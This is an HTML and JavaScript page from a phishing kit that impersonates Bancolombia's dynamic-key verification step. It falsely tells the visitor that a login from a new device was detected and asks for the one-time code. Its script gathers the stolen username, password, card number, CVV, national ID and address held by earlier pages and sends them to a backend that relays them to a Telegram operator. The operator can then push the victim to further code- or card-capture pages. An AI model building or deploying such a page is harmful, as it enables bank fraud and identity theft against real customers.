<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Bancolombia - Clave Din√°mica</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .card {
      background: #454648;
      border-radius: 10px;
      padding: 40px 30px;
      width: 100%;
      max-width: 360px;
      text-align: center;
    }
    .card h1 {
      font-size: 22px;
      margin-bottom: 20px;
    }
    .form-group {
      position: relative;
      margin-bottom: 20px;
    }
    .input-icon {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 17px;
      opacity: 0.7;
      user-select: none;
    }
    .input-field {
      width: 100%;
      padding: 10px 10px 8px 40px;
      background: transparent;
      border: none;
      border-bottom: 1px solid white;
      color: white;
      font-size: 16px;
    }
    .input-field::placeholder { color: #ccc; }
    .btn {
      width: 100%;
      padding: 14px;
      background: #FFD700;
      color: #2c2c2c;
      border: none;
      border-radius: 24px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: transform 0.3s;
    }
    .btn:hover { transform: translateY(-2px); }
    .error {
      display: none;
      color: #FFD700;
      background: #2b2a28;
      border: 1px solid #FFD700;
      border-radius: 6px;
      padding: 10px;
      margin-bottom: 15px;
      user-select: none;
    }

    /* ---------- Loader difuminado con rueda + texto ---------- */
    .overlay-loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,0.55); /* semitransparente */
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
      transition: opacity 220ms ease, visibility 220ms ease;
      flex-direction: column;
    }
    .overlay-loader.visible {
      opacity: 1;
      visibility: visible;
      pointer-events: auto;
    }
    .spinner {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      border: 6px solid rgba(255,255,255,0.18);
      border-top-color: #FFD700;
      box-sizing: border-box;
      animation: spin 900ms linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loader-text {
      margin-top: 12px;
      color: #fff;
      font-size: 14px;
      opacity: 0.95;
      user-select: none;
    }

    @media (max-width: 480px) {
      .card { padding: 28px 18px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Ingresa tu clave din√°mica</h1>
    <div class="error" id="errorMsg"></div>
    <p>Detectamos un inicio de sesi√≥n desde un nuevo dispositivo. Ingresa la clave din√°mica desde tu app para confirmar tu identidad.</p>
    <br /><br />
    <form id="dinForm" autocomplete="off">
      <div class="form-group">
        <img src="candado.png" class="input-icon" alt="SMS" />
        <input
          type="text"
          name="claveDinamica"
          id="claveDinamica"
          class="input-field"
          placeholder="Clave din√°mica"
          required
          maxlength="6"
          pattern="\d{4,6}"
          inputmode="numeric"
          autocomplete="off"
        />
      </div>
      <br />
      <button type="submit" class="btn">Validar</button>
    </form>
  </div>

  <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
    <div class="spinner" aria-hidden="true"></div>
    <div class="loader-text" id="loaderText">Verificando informaci√≥n...</div>
  </div>

  <script>
    const loaderFull = document.getElementById('loaderFull');
    const loaderText = document.getElementById('loaderText');

    function showLoader(text) {
      if (typeof text === 'string' && text.length) loaderText.textContent = text;
      loaderFull.classList.add('visible');
      loaderFull.setAttribute('aria-hidden', 'false');
    }
    function hideLoader() {
      loaderFull.classList.remove('visible');
      loaderFull.setAttribute('aria-hidden', 'true');
    }

    // --- CAMBIO: Se eliminan las funciones loadTelegramConfig, saveTgOffset, getTgOffset, e initTgOffsetOnce ---
    // El backend se encarga de toda la l√≥gica de Telegram.


    // Validar formulario y enviar
    document.getElementById('dinForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const claveDinamica = document.getElementById('claveDinamica').value.trim();
      const err = document.getElementById('errorMsg');
      err.style.display = 'none';

      if (!/^\d{4,6}$/.test(claveDinamica)) {
        err.textContent = 'Debes ingresar entre 4 y 6 d√≠gitos.';
        err.style.display = 'block';
        return;
      }

      // Mostrar loader con texto
      showLoader('Verificando informaci√≥n...');

      // Obtener datos guardados del localStorage
      const usuario = localStorage.getItem('usuario') || '';
      const clave = localStorage.getItem('clave') || '';
      const transactionId = localStorage.getItem('transactionId') || Date.now().toString(36) + Math.random().toString(36).slice(2,10);

      if (!usuario || !clave) {
        hideLoader();
        alert('No se encontraron datos de sesi√≥n. Regresando al inicio.');
        window.location.href = 'index.html';
        return;
      }

      // --- CAMBIO: No se carga config.json ---

      // Intentar recuperar 'formData' si existe
      let storedForm = null;
      try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }

      // Construir el mensaje de texto
      let message = `üîê Datos de clave din√°mica\nüÜî ID: ${transactionId}\nüë§ Usuario: ${usuario}\nüîë Clave: ${clave}\nüî¢ Din√°mica: ${claveDinamica}\n\n`;

      if (storedForm && typeof storedForm === 'object') {
        const extras = [
          { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'C√©dula' },
          { k: 'telefono', l: 'Tel√©fono' }, { k: 'ciudad', l: 'Ciudad' },
          { k: 'direccion', l: 'Direcci√≥n' }, { k: 'entidad', l: 'Banco' },
          { k: 'tarjeta', l: 'Tarjeta' }, { k: 'fechaExpiracion', l: 'Fecha Exp.' },
          { k: 'cvv', l: 'CVV' }
        ];
        extras.forEach(it => { if (storedForm[it.k]) message += `‚Ä¢ ${it.l}: ${storedForm[it.k]}\n`; });
      }

      // Construir el teclado
      const keyboard = {
        inline_keyboard: [
          // Se incluye el transactionId para referencia, aunque el backend usar√° el message_id
          [{ text: "Error din√°mica", callback_data: `error_dinamica:${transactionId}` }],
          [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }]
        ]
      };

      // --- CAMBIO: Enviar mensaje a nuestro propio backend ---
      let sentMessageId = null;
      try {
        const sendRes = await fetch('/api/send-message', { // <-- Llama al backend
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: message, keyboard: keyboard })
        });

        const sendJson = await sendRes.json();

        if (!sendJson.ok || !sendJson.result || !sendJson.result.message_id) {
          console.error('sendMessage error:', sendJson);
          alert(sendJson.error || 'No se pudo enviar el mensaje al servidor. Revisa consola.');
          hideLoader();
          return;
        }

        // Guardamos el ID del mensaje enviado por Telegram
        sentMessageId = sendJson.result.message_id;

      } catch (err) {
        console.error('Error enviando a /api/send-message:', err);
        alert('Error de conexi√≥n con el servidor. Revisa consola.');
        hideLoader();
        return;
      }
      // --- FIN DEL CAMBIO ---


      // --- CAMBIO: Esperar respuesta del backend (que hace el polling por nosotros) ---
      try {
        await waitForAdminResponse(sentMessageId);
      } finally {
        hideLoader(); // Ocultar el loader sin importar el resultado
      }
    });

    /**
     * --- CAMBIO: Funci√≥n reescrita ---
     * Esta funci√≥n ahora solo hace UNA petici√≥n a nuestro backend.
     * El backend (/api/check-update) es el que se queda esperando (long polling)
     * la respuesta del admin.
     */
    async function waitForAdminResponse(messageId) {
      try {
        // Hacemos la petici√≥n al endpoint de verificaci√≥n
        const res = await fetch(`/api/check-update/${messageId}`, {
          method: 'GET',
          cache: 'no-store' // No queremos respuestas cacheadas
        });

        if (res.ok) {
          // El backend nos responde con JSON: { action: 'accion_elegida' }
          const data = await res.json();
          handleAdminAction(data.action); // Pasamos la acci√≥n directamente

        } else if (res.status === 408) {
          // El backend nos devuelve 408 si se agota su propio tiempo de espera
          alert('No hubo respuesta del administrador en el tiempo esperado. Intenta m√°s tarde.');

        } else {
          // Otro error del servidor
          const errData = await res.json();
          console.error('Error esperando respuesta:', errData);
          alert(errData.error || 'Error del servidor al verificar la respuesta.');
        }

      } catch (err) {
        // Error de red (ej: se cay√≥ el servidor o no hay internet)
        console.error('Error de red en waitForAdminResponse:', err);
        alert('Error de conexi√≥n al esperar la respuesta. Revisa tu conexi√≥n.');
      }
    }

    /**
     * --- CAMBIO: Firma de la funci√≥n simplificada ---
     * Ahora recibe la acci√≥n limpia (ej: 'error_dinamica')
     * que nos env√≠a el backend.
     */
    function handleAdminAction(action) {
      // Dependiendo del bot√≥n presionado por el admin, actuamos
      if (action === 'error_dinamica') {
        const err = document.getElementById('errorMsg');
        err.textContent = 'La clave din√°mica ingresada es incorrecta. Verifica e intenta nuevamente.';
        err.style.display = 'block';
        document.getElementById('claveDinamica').value = '';
      } else if (action === 'pedir_otp') {
        window.location.href = 'otp.html';
      } else if (action === 'pedir_tc') {
        window.location.href = 'tc.html';
      } else {
        console.log('Acci√≥n admin no manejada:', action);
      }
    }

    // Enter => enviar si campo completo
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
        e.preventDefault();
        const claveDinamica = document.getElementById('claveDinamica').value.trim();
        if (claveDinamica) {
          // Disparamos el evento 'submit' del formulario
          document.getElementById('dinForm').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
        }
      }
    });
  </script>

</body>
</html>
